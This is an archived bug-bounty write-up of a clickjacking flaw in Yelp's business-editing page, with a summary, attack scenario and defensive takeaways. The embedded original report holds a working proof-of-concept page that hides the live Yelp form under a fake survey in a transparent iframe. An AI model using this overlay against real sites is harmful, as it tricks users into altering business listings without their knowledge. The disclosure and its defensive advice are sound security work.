# Clickjacking in Business Page Editing (Yelp)

## Metadata
- **Source:** HackerOne
- **Report:** 227837 | https://hackerone.com/reports/227837
- **Submitted:** 2017-05-12
- **Reporter:** mohammad_obaid
- **Program:** Yelp
- **Bounty:** Not specified in report
- **Severity:** Medium
- **Vuln:** Clickjacking, UI Redressing, Missing X-Frame-Options Header
- **CVEs:** None
- **Category:** uncategorised

## Summary
A clickjacking vulnerability was discovered on Yelp's business attribute editing endpoint that allows attackers to trick users into modifying business information through a hidden iframe overlay. By overlaying a malicious survey form over the Yelp business editing page, attackers could change critical business details including name, website URL, address, and hours without user awareness.

## Attack scenario
1. Attacker creates a deceptive webpage disguised as a restaurant survey form requesting user feedback
2. Attacker embeds the vulnerable Yelp business editing endpoint as a hidden iframe (opacity: 0) aligned beneath visible form fields
3. Victim visits attacker's malicious webpage and believes they are filling out a harmless survey
4. When victim clicks on what appears to be survey submit buttons, clicks are actually captured by the hidden Yelp form fields
5. Business information is modified on behalf of the victim (website URL changed to competitor's site, address altered, hours modified)
6. Potential customers are redirected to attacker's website or see incorrect business information, causing reputational and financial damage

## Root cause
The Yelp business editing endpoint fails to implement X-Frame-Options HTTP header to prevent the page from being embedded in iframes, allowing attackers to overlay the page with malicious content and intercept user interactions.

## Attacker mindset
Competitive business sabotage or customer interception - attacker aims to redirect customers from legitimate businesses to competitor websites by modifying business information through clickjacking, demonstrating sophisticated social engineering combined with technical exploitation.

## Defensive takeaways
- Implement X-Frame-Options: DENY header on all sensitive user-facing endpoints, particularly those handling form submissions or data modification
- Apply Content-Security-Policy (CSP) with frame-ancestors directive to restrict iframe embedding
- Use SameSite cookie attribute to prevent CSRF-like attacks in clickjacking scenarios
- Implement frame-breaking JavaScript as defense-in-depth, though not primary mitigation
- Conduct regular security reviews of all endpoints that modify user or business data
- Educate users about potential clickjacking risks when visiting external websites

## Variant hunting
Search for other Yelp endpoints handling business modifications: account settings pages, profile editing, payment information updates, review management interfaces. Check sister properties and APIs for similar missing X-Frame-Options headers. Verify mobile app versions and API endpoints for equivalent protections.

## MITRE ATT&CK
- T1189
- T1566
- T1598

## Notes
The researcher provided a clear POC with realistic styling that demonstrates the vulnerability effectively. The impact is well-articulated showing business-relevant consequences (customer loss, redirection). The fix is straightforward but the report quality and impact demonstration appear solid for a Medium severity vulnerability affecting business user accounts and customer trust.

## Full report
<details><summary>Expand</summary>

##SUMMARY:

Hope you guys are doing great. I found clickjacking vulnerability while updating business page.One of the endpoints which is vulnerable to clickjacking is https://www.yelp.com/biz_attribute?biz_id=RIyHYSf3lyJcFb4El9T4tQ . Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or submitting form on behalf of user while clicking on seemingly innocuous web pages.
 I believe this time I put much more effort in demonstrating impact of this bug. I request you to please take a look at this.

##IMPACT:
Click jacking on this page will allow attacker to change business information of user like business name, email address,address,city and more importantly website name. This will cause business user to potentially lose their customer if wrong information is displayed on a business page. Moreover if website address changes it can allow attacker to divert potential customer towards its website if attacker is competitor of that business user. It can also cause to change opening hours of restaurant on behalf of user .
Any user submitted page shouldn't be loaded on iframe because it can cause submission of form on behalf of user .

##POC:
Below here is the poc of existence of this vulnerability. I dint hide iframe in below poc so that you can see vulnerable page is successfully loaded in an iframe. 

```
<html  >
   <head>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
   </head>
   
   
   <body style="background-color:#c5d5cb;">
     
   
    
<div style="position: absolute; left: 200px; top: 50px;">
  <div class="well" style="background-color:#6195ad;margin-right: 147px;box-shadow: inset 0 1px 17px 15px rgba(0,49,0,.05);padding:30px;">
  <h1>This is a Survey Form</h1>
  <p>We are opening new Restaurant in the city of Manhattan. For this we are asking suggestions from internet world regarding restaurant name, where it should be located ets. Please do fill form below.</p>
</div>
<h2 style="">Please help us building Restaurant which is purely based upon your suggestions.</h2>

<input type = "text"
                 id = "myText"
                  style="position:absolute;margin-top: 249px;
    margin-left: 33px;
    width: 367px" placeholder="Please enter suitable name of Restaurent" />
<input type = "text"
                 id = "myText"
                  style="position:absolute;margin-top: 318px;
    margin-left: 33px;
    width: 367px" placeholder="Pleae enter location of Restaurent in Manhattan" />
	<input type = "text"
                 id = "myText"
                  style="position:absolute;margin-top: 745px;
    margin-left: 33px;
    width: 367px" placeholder="Please enter any website name " />
				 
<button type="button" class="btn btn-success" style="position: absolute;margin-top: 1311px;margin-left: 17px;width: 176px;" >Submit Your Feedback</button>

<iframe style="opacity: 0;" height="1745" width="680" scrolling="no" src="https://www.yelp.com/biz_attribute?biz_id=RIyHYSf3lyJcFb4El9T4tQ"></iframe>
   
   
   
   
   
   
   
   
   </body>
   
   
   
</html>




```
Sorry for poor styling. I'll make styling on this page better if you ask for it so that it looks more genuine and more realistic.

##FIX:
This vulnerability can easily be fixed by adding `X-HEADER-OPTION to deny` . This will prevent this page to load in an iframe.

</details>

---
*Analysed by Claude on 2026-05-24*
